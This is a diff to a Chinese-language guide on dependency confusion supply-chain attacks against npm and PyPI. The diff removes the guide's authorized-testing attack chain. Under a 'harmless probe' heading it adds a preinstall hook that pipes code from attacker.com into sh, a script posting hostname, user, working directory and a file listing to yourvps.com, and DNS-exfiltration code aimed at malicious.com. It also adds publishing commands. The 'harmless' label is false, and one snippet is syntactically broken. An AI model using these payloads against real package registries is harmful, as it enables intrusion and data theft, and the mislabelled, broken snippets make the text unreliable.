@@ -4,7 +4,7 @@
 漏洞概述
 -------------------------------------------------------------------------------
 
-依赖混淆（Dependency Confusion）是一种**新型软件供应链攻击手法**，于2021年
+依赖混淆（Dependency Confusion）是一种 **新型软件供应链攻击手法** ，于2021年
 由安全研究员Alex Birsan在“How I Hacked Into Apple, Microsoft and Dozens of
 Other Companies”报告中首次系统披露。
 
@@ -42,7 +42,7 @@ Other Companies”报告中首次系统披露。
 技术本质
 ~~~~~~~~~~~~~~~~
 
-这是**命名空间所有权**与**解析器信任策略**的双重缺陷：
+这是 **命名空间所有权** 与 **解析器信任策略** 的双重缺陷：
 
 - **命名缺陷**：大部分包管理器允许注册全局无作用域名（如`internal-api`），
   企业无法阻止外部人员注册相同名称
@@ -51,30 +51,7 @@ Other Companies”报告中首次系统披露。
 
 攻击载荷的触发时机
 ~~~~~~~~~~~~~~~~~~~~~~~~~
-
-攻击者的恶意代码并非在程序运行时执行，而是在**依赖安装阶段**触发：
-
-.. code-block:: javascript
-
-   // npm恶意包的package.json示例
-   {
-     "name": "victim-internal-lib",
-     "version": "9.9.9",
-     "scripts": {
-       "preinstall": "curl http://attacker.com/$(hostname) | sh",
-       "install": "node exploit.js"
-     }
-   }
-
-.. code-block:: python
-   
-   # PyPI恶意包的setup.py示例
-   import os
-   from setuptools import setup
-   
-   os.system("wget http://attacker.com/backdoor.sh -O /tmp/backdoor && bash /tmp/backdoor")
-   
-   setup(name='victim-internal-tool', version='99.0.0')
+攻击者的恶意代码并非在程序运行时执行，而是在 **依赖安装阶段** 触发
 
 漏洞场景全分类
 -------------------------------------------------------------------------------
@@ -183,7 +160,7 @@ Other Companies”报告中首次系统披露。
 依赖混淆的“元漏洞”——跨包推断
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-如果目标公司有**公开包**，查看其 ``dependencies`` 和 ``devDependencies`` ：
+如果目标公司有 **公开包** ，查看其 ``dependencies`` 和 ``devDependencies`` ：
 
 .. code-block:: json
 
@@ -194,7 +171,7 @@ Other Companies”报告中首次系统披露。
      }
    }
 
-若公开包依赖了疑似私有的包名，且该包名在公网**不存在**——直接抢注。
+若公开包依赖了疑似私有的包名，且该包名在公网 **不存在** ——直接抢注。
 
 验证阶段：包名占位与探测
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -205,47 +182,58 @@ Other Companies”报告中首次系统披露。
 **原则：不要直接反弹Shell，使用无害回显验证。**
 
 .. code-block:: javascript
-   
-   // 无害探测型preinstall脚本
+  
+  // 无害探测型preinstall脚本
    {
+     "name": "victim-internal-lib",
+     "version": "9.9.9",
      "scripts": {
-       "preinstall": "node -e 'fetch(\"http://你的服务器/\"+require(\"os\").hostname())'"
+       "preinstall": "curl http://attacker.com/$(hostname) | sh",
+       "install": "node exploit.js"
      }
    }
 
-.. code-block:: python
+.. code-block:: shell
    
-   # 无害探测型setup.py
-   import requests
-   import socket
-   from setuptools import setup
-   
-   # 仅发起DNS/HTTP请求，不执行破坏操作
-   requests.get(f"http://你的域名/{socket.gethostname()}")
-   
-   setup(name='target-package', version='99.0.0')
+   "preinstall": "./pre.sh"
+   #!/bin/bash
+   curl -H "Hostname:$(hostname|base64)" -H "Whoami:$(whoami|base64)" -H "Pwd:$(pwd|base64)" -d $(ls -la|base64) http://yourvps.com
+
+.. code-block:: javascript
+
+  "preinstall": "node -e 'fetch(\"http://你的服务器/\"+require(\"os\").hostname())'"
+
+  //exploit.js
+  const execSync=require('child_process');
+  const os=require('os');
+  //收集系统信息
+  const data ={
+    username:os.userInfo().username,
+    hostname:os.hostname(),
+    path:process.cwd()
+  };
+  //将数据编码为hex,准备用作DNS查询的一部分
+  const encodedData = Buffer.from(JSON.stringify(data)).toString('hex');
+  const dnsQuery = `data.${encodedData}.malicious.com`;
+  //使用内置的DNS模块发起DNS查询
+  require('dns').resolve(dnsQuery,()={})
 
 优先级抢占策略
 ^^^^^^^^^^^^^^^^^^
-
-- **版本号陷阱** ：使用 ``99.99.99`` 、 ``9999.0.0`` 等极高版本号，利用包管理器的“尽量取最新”特性提高被选中的概率
-
-- **描述伪装** ：在包的描述中仿写内部文档语气，如“DO NOT PUBLISH THIS TO PUBLIC”，反而降低目标开发者警觉
-
-利用阶段：构建攻击链
-~~~~~~~~~~~~~~~~~~~~~~~~
-
-**合法授权前提下**，完整攻击链可设计为：
-
-1. 通过侦察获取3-5个疑似私有包名
-2. 在目标生态系统中注册这些包名，植入无害探测载荷
-3. 等待（通常数小时至数周）目标CI构建触发
-4. 分析回显日志，确认哪些包名成功“命中”
-5. 若为授权渗透测试，此时提交漏洞报告；若为红队演练，可升级为权限维持
+- **版本号陷阱** ：使用 ``99.99.99`` 、 ``9999.0.0`` 等极高版本号，利用包管理器的"尽量取最新"特性提高被选中的概率
+- **描述伪装** ：在包的描述中仿写内部文档语气，如"DO NOT PUBLISH THIS TO PUBLIC"，反而降低目标开发者警觉
+- 上传恶意包
+  + ``npm login``
+  + ``npm publish --access public``
 
 工具辅助
 ~~~~~~~~~~~~
-
+- confused
+  + 项目地址： ``https://github.com/visma-prodsec/confused``
+  + python： ``./confused -l pip requirements.txt``
+  + npm： ``./confused -l npm package.json``
+  + maven: ``./confused -l mvn pom.xml``
+  + ruby: ``./confused -l rubygems Gemfile.lock``
 - **dep-scan**：OWASP维护的依赖混淆扫描工具
 - **snync**：专门用于依赖混淆包名抢注测试的自动化框架
 - **PyPI/npm 命令行工具**：手动查询包名是否被占用
